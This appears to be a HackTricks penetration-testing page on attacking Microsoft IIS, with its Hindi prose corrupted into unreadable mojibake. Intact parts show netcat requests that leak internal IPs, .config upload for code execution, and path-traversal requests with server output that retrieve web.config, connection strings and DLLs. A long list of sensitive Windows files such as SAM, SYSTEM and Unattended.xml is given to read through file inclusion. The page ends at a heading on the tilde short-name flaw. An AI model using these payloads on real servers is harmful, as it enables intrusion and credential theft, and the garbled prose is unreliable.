# IIS - рдЗрдВрдЯрд░рдиреЗрдЯ рдЗрдиреНрдлреЙрд░реНрдореЗрд╢рди рд╕рд░реНрд╡рд┐рд╕реЗрдЬ

<details>

<summary><strong> AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ </strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>

рдкрд░реАрдХреНрд╖рдг рдпреЛрдЧреНрдп рдлрд╛рдЗрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рди:

* asp
* aspx
* config
* php

## рдЖрдВрддрд░рд┐рдХ IP рдкрддреЗ рдХрд╛ рдЦреБрд▓рд╛рд╕рд╛

рдХрд┐рд╕реА рднреА IIS рд╕рд░реНрд╡рд░ рдкрд░ рдЬрд╣рд╛рдВ рдЖрдкрдХреЛ 302 рдорд┐рд▓рддрд╛ рд╣реИ, рдЖрдк Host рд╣реЗрдбрд░ рдХреЛ рд╣рдЯрд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ HTTP/1.0 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЕрдВрджрд░ Location рд╣реЗрдбрд░ рдЖрдкрдХреЛ рдЖрдВрддрд░рд┐рдХ IP рдкрддреЗ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЬреЛ рдЖрдВрддрд░рд┐рдХ IP рдХрд╛ рдЦреБрд▓рд╛рд╕рд╛ рдХрд░рддреА рд╣реИ:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## .config рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ

рдЖрдк .config рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдирдХрд╛ рдЙрдкрдпреЛрдЧ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдРрд╕рд╛ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд╣реИ рдХреЛрдб рдХреЛ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрдд рдореЗрдВ HTML рдЯрд┐рдкреНрдкрдгреА рдХреЗ рдЕрдВрджрд░ рдЬреЛрдбрд╝рдирд╛: [рдЙрджрд╛рд╣рд░рдг рдпрд╣рд╛рдБ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рддрдХрдиреАрдХреЛрдВ рдФрд░ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS рдбрд┐рд╕реНрдХрд╡рд░реА рдмреНрд░реВрдЯрдлреЛрд░реНрд╕

рдореИрдВрдиреЗ рдЬреЛ рд╕реВрдЪреА рдмрдирд╛рдИ рд╣реИ рдЙрд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

рдпрд╣ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реВрдЪрд┐рдпреЛрдВ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдорд┐рд▓рд╛рдХрд░ рдмрдирд╛рдИ рдЧрдИ рдереА:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

рдЗрд╕реЗ рдХрд┐рд╕реА рднреА рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЛ рдЬреЛрдбрд╝реЗ рдмрд┐рдирд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рдЬрд┐рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЗрд╕рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЙрдирдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдпрд╣ рд╣реЛрддрд╛ рд╣реИред

## рдкрде рдпрд╛рддреНрд░рд╛

### рд╕реНрд░реЛрдд рдХреЛрдб рдХрд╛ рд▓реАрдХ рд╣реЛрдирд╛

{% hint style="info" %}
рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ, рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдлрд╝реЛрд▓реНрдбрд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдХрдИ web.config рдлрд╝рд╛рдЗрд▓реЗрдВ "**assemblyIdentity**" рдлрд╝рд╛рдЗрд▓реЛрдВ рдФрд░ "**namespaces**" рдХреЗ рд╕рдВрджрд░реНрднреЛрдВ рдХреЗ рд╕рд╛рде рд╣реЛрддреА рд╣реИрдВред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рд╕реЗ рдпрд╣ рдкрддрд╛ рдЪрд▓ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ **рдХрд╣рд╛рдБ рдкрд░ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓реНрд╕ рд╕реНрдерд┐рдд рд╣реИрдВ** рдФрд░ рдЙрдиреНрд╣реЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
**рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдП рдЧрдП Dlls** рд╕реЗ рднреА рдирдП **namespaces** рдХрд╛ рдкрддрд╛ рдЪрд▓ рд╕рдХрддрд╛ рд╣реИ рдЬрд╣рд╛рдБ рдЖрдкрдХреЛ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рдФрд░ web.config рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рдирдП namespaces рдФрд░ assemblyIdentity рдХрд╛ рдкрддрд╛ рдЪрд▓ рд╕рдХреЗред\
рд╕рд╛рде рд╣реА, рдлрд╝рд╛рдЗрд▓реЗрдВ **connectionstrings.config** рдФрд░ **global.asax** рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рд╣реЛ рд╕рдХрддреА рд╣реИред\
рд╕рдВрджрд░реНрдн: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)
{% endhint %}

рдХрд┐рд╕реА рднреА .Net рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рддрд░рд╣, MVC рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдПрдХ **web.config** рдлрд╝рд╛рдЗрд▓ рд╣реЛрддреА рд╣реИ, рдЬрд╣рд╛рдБ "**assemblyIdentity**" XML рдЯреИрдЧреНрд╕ рд╣рд░ рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
[...]

HTTP/1.1 200 OK
[...]
<?xml version="1.0" encoding="utf-8"?>
<configuration>
<configSections>
<section name="entityFramework" type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral" requirePermission="false" />
</configSections>
<appSettings>
<add key="webpages:Version" value="3.0.0.0" />
<add key="webpages:Enabled" value="false" />
<add key="ClientValidationEnabled" value="true" />
<add key="UnobtrusiveJavaScriptEnabled" value="true" />
</appSettings>
<system.web>
<authentication mode="None" />
<compilation debug="true" targetFramework="4.6.1" />
<httpRuntime targetFramework="4.6.1" />
</system.web>
<system.webServer>
<modules>
<remove name="FormsAuthentication" />
</modules>
</system.webServer>
<runtime>
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<dependentAssembly>
<assemblyIdentity name="Microsoft.Owin.Security" />
<bindingRedirect oldVersion="1.0.0.0-3.0.1.0" newVersion="3.0.1.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="Microsoft.Owin.Security.OAuth" />
<bindingRedirect oldVersion="1.0.0.0-3.0.1.0" newVersion="3.0.1.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="Microsoft.Owin.Security.Cookies" />
<bindingRedirect oldVersion="1.0.0.0-3.0.1.0" newVersion="3.0.1.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="Microsoft.Owin" />
<bindingRedirect oldVersion="1.0.0.0-3.0.1.0" newVersion="3.0.1.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="Newtonsoft.Json" culture="neutral" />
<bindingRedirect oldVersion="0.0.0.0-6.0.0.0" newVersion="6.0.0.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="System.Web.Optimization" />
<bindingRedirect oldVersion="1.0.0.0-1.1.0.0" newVersion="1.1.0.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="WebGrease" />
<bindingRedirect oldVersion="0.0.0.0-1.5.2.14234" newVersion="1.5.2.14234" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="System.Web.Helpers" />
<bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="System.Web.Mvc" />
<bindingRedirect oldVersion="1.0.0.0-5.2.3.0" newVersion="5.2.3.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="System.Web.WebPages" />
<bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
</dependentAssembly>
</assemblyBinding>
```
рдкрд┐рдЫрд▓реЗ рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рдЖрдкрдиреЗ рдХрдИ "**assemblyIdentity**" рдХреЗ рд╕рдВрджрд░реНрдн рджреЗрдЦреЗ рд╣реЛрдВрдЧреЗред рдпреЗ рдлрд╛рдЗрд▓реЗрдВ /bin рдлреЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ рд╕реНрдерд┐рдд рд╣реЛ рд╕рдХрддреА рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: **/bin/WebGrease.dll.**

рдЕрдиреНрдп рдлрд╛рдЗрд▓реЗрдВ рдЬреЛ .Net рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рд░реВрдЯ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ рдкрд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ рд╡реЗ рд╣реИрдВ **/global.asax**
```markup
<%@ Application Codebehind="Global.asax.cs" Inherits="WebApplication1.MvcApplication" Language="C#" %>
```
рдФрд░ **/connectionstrings.config**

**рдиреЛрдЯ: рдЗрд╕ рдлрд╛рдЗрд▓ рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рд╣реЛрддреЗ рд╣реИрдВ!**
```markup
<connectionStrings>
<add name="DefaultConnection" connectionString="Data Source=(LocalDb)\MSSQLLocalDB;AttachDbFilename [...]" providerName="System.Data.SqlClient" />
</connectionStrings>
```
**рдиреЗрдорд╕реНрдкреЗрд╕реЗрд╕**

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, .Net MVC рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреЛ рдЗрд╕ рддрд░рд╣ рд╕реЗ рд╕рдВрд░рдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ **рдЕрдиреНрдп web.config рдлрд╛рдЗрд▓реЛрдВ** рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЬрд┐рд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдкреНрд░рддреНрдпреЗрдХ рд╕реЗрдЯ рдХреЗ viewpages рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢рд┐рд╖реНрдЯ рдиреЗрдорд╕реНрдкреЗрд╕реЗрд╕ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рднреА рдШреЛрд╖рдгрд╛ рд╢рд╛рдорд┐рд▓ рдХрд░рдирд╛ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдбреЗрд╡рд▓рдкрд░реНрд╕ рдХреЛ рд╣рд░ рдлрд╛рдЗрд▓ рдореЗрдВ тАЬ@usingтАЭ рдиреЗрдорд╕реНрдкреЗрд╕реЗрд╕ рдХреА рдШреЛрд╖рдгрд╛ рдХрд░рдиреЗ рд╕реЗ рд░рд╛рд╣рдд рдорд┐рд▓рддреА рд╣реИред
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
[...]

HTTP/1.1 200 OK
[...]
<?xml version="1.0"?>
<configuration>
<configSections>
<sectionGroup name="system.web.webPages.razor" type="System.Web.WebPages.Razor.Configuration.RazorWebSectionGroup, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral">
<section name="host" type="System.Web.WebPages.Razor.Configuration.HostSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral" requirePermission="false" />
<section name="pages" type="System.Web.WebPages.Razor.Configuration.RazorPagesSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral" requirePermission="false" />
</sectionGroup>
</configSections>
<system.web.webPages.razor><host factoryType="System.Web.Mvc.MvcWebRazorHostFactory, System.Web.Mvc, Version=5.2.3.0, Culture=neutral" /><pages pageBaseType="System.Web.Mvc.WebViewPage">
<namespaces>
<add namespace="System.Web.Mvc" />
<add namespace="System.Web.Mvc.Ajax" />
<add namespace="System.Web.Mvc.Html" />
<add namespace="System.Web.Optimization"/>
<add namespace="System.Web.Routing" />
<add namespace="WebApplication1" />
```
**DLLs рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛**

рдПрдХ рдкрд┐рдЫрд▓реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕реЗ, **рдХрд╕реНрдЯрдо рдиреЗрдорд╕реНрдкреЗрд╕** рдХреА рдШреЛрд╖рдгрд╛ (рдЪреВрдВрдХрд┐ рдЕрдиреНрдп рдиреЗрдорд╕реНрдкреЗрд╕ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╣реИрдВ) рд╕реЗ рд╕рдВрдХреЗрдд рдорд┐рд▓рддрд╛ рд╣реИ рдХрд┐ "**WebApplication1**" рдирд╛рдордХ рдПрдХ DLL /bin рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдореМрдЬреВрдж рд╣реИред
```
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
[...]
```
рдкрд┐рдЫрд▓реЗ рдЖрдЙрдЯрдкреБрдЯ рд╕реЗ, /bin рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЗ рдЕрдВрджрд░ рдЖрдкрдХреЛ Dlls рднреА рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВ

* System.Web.Mvc.dll
* System.Web.Mvc.Ajax.dll
* System.Web.Mvc.Html.dll
* System.Web.Optimization.dll
* System.Web.Routing.dll

рдорд╛рди рд▓реАрдЬрд┐рдП рдХрд┐ рдкрд┐рдЫрд▓рд╛ DLL рдПрдХ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЛ рдЗрдореНрдкреЛрд░реНрдЯ рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬрд┐рд╕реЗ **WebApplication1.Areas.Minded.** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдпрд╣ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЕрдиреНрдп web.config рдлрд╛рдЗрд▓реЗрдВ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдореМрдЬреВрдж рд╣реИрдВ, рдЕрдиреБрдорд╛рдирд┐рдд/рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкрдереЛрдВ рдореЗрдВ рдЬреИрд╕реЗ рдХрд┐ **/area-name/Views/**, рдЬрд┐рд╕рдореЗрдВ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ /bin рдлреЛрд▓реНрдбрд░ рдореЗрдВ рдореМрдЬреВрдж рдЕрдиреНрдп DLL рдлрд╛рдЗрд▓реЛрдВ рдХрд╛ рдЙрд▓реНрд▓реЗрдЦ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```markup
GET /download_page?id=..%2f..%2fMinded/Views/web.config HTTP/1.1
Host: example-mvc-application.minded
[...]

HTTP/1.1 200 OK
[...]
<?xml version="1.0"?>
<configuration>
<configSections>
<sectionGroup name="system.web.webPages.razor" type="System.Web.WebPages.Razor.Configuration.RazorWebSectionGroup, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral">
<section name="host" type="System.Web.WebPages.Razor.Configuration.HostSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral" requirePermission="false" />
<section name="pages" type="System.Web.WebPages.Razor.Configuration.RazorPagesSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutralтАЭ requirePermission="false" />
</sectionGroup>
</configSections>
<system.web.webPages.razor><host factoryType="System.Web.Mvc.MvcWebRazorHostFactory, System.Web.Mvc, Version=5.2.3.0, Culture=neutral" />
<pages pageBaseType="System.Web.Mvc.WebViewPage">
<namespaces>
<add namespace="System.Web.Mvc" />
<add namespace="System.Web.Mvc.Ajax" />
<add namespace="System.Web.Mvc.Html" />
<add namespace="System.Web.Routing" />
<add namespace="System.Web.Optimization" />
<add namespace="WebApplication1" />
<add namespace="WebApplication1.AdditionalFeatures" />
</namespaces>
```
рдкрд┐рдЫрд▓реЗ рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдирдпрд╛ рдирд╛рдорд╕реНрдерд╛рди рд╣реИ рдЬрд┐рд╕реЗ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ: **WebApplication1.AdditionalFeatures** рдЬреЛ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ /bin рдлреЛрд▓реНрдбрд░ рдореЗрдВ рдПрдХ рдФрд░ Dll рд╣реИ рдЬрд┐рд╕реЗ **WebApplication1.AdditionalFeatures.dll** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ

### рд╕рд╛рдорд╛рдиреНрдп рдлрд╛рдЗрд▓реЗрдВ

[рдпрд╣рд╛рдБ](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/) рд╕реЗ
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 рддреНрд░реБрдЯрд┐

рдпрджрд┐ рдЖрдкрдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреИрд╕реА рддреНрд░реБрдЯрд┐ рджрд┐рдЦрд╛рдИ рджреЗ:

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (13).png>)

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ рдХреЛ **рд╕рд╣реА рдбреЛрдореЗрди рдирд╛рдо Host рд╣реЗрдбрд░ рдореЗрдВ рдирд╣реАрдВ рдорд┐рд▓рд╛**ред\
рд╡реЗрдм рдкреЗрдЬ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк **SSL рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╢рд╛рдпрдж рдЖрдкрдХреЛ рд╡рд╣рд╛рдБ рдбреЛрдореЗрди/рд╕рдмрдбреЛрдореЗрди рдирд╛рдо рдорд┐рд▓ рдЬрд╛рдПред рдЕрдЧрд░ рд╡рд╣рд╛рдБ рдирд╣реАрдВ рд╣реИ рддреЛ рдЖрдкрдХреЛ **VHosts рдХреЛ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕** рдХрд░рдирд╛ рдкрдбрд╝ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рддрдХ рдХрд┐ рдЖрдк рд╕рд╣реА рдПрдХ рдирд╣реАрдВ рдвреВрдБрдв рд▓реЗрддреЗред

## рдкреБрд░рд╛рдиреЗ IIS рдХрдордЬреЛрд░рд┐рдпрд╛рдБ рдЬрд┐рдиреНрд╣реЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рд┐рдП

### Microsoft IIS рдЯрд┐рд▓реНрдбреЗ рдХреИрд░реЗрдХреНрдЯрд░ тАЬ\~тАЭ рдХрдордЬреЛрд░реА/рдлреАрдЪрд░ тАУ рд╢реЙрд░реНрдЯ рдлрд╛рдЗрд▓/рдлреЛрд▓реНрдбрд░ рдирд╛рдо рдкреНрд░рдХрдЯреАрдХрд░рдг

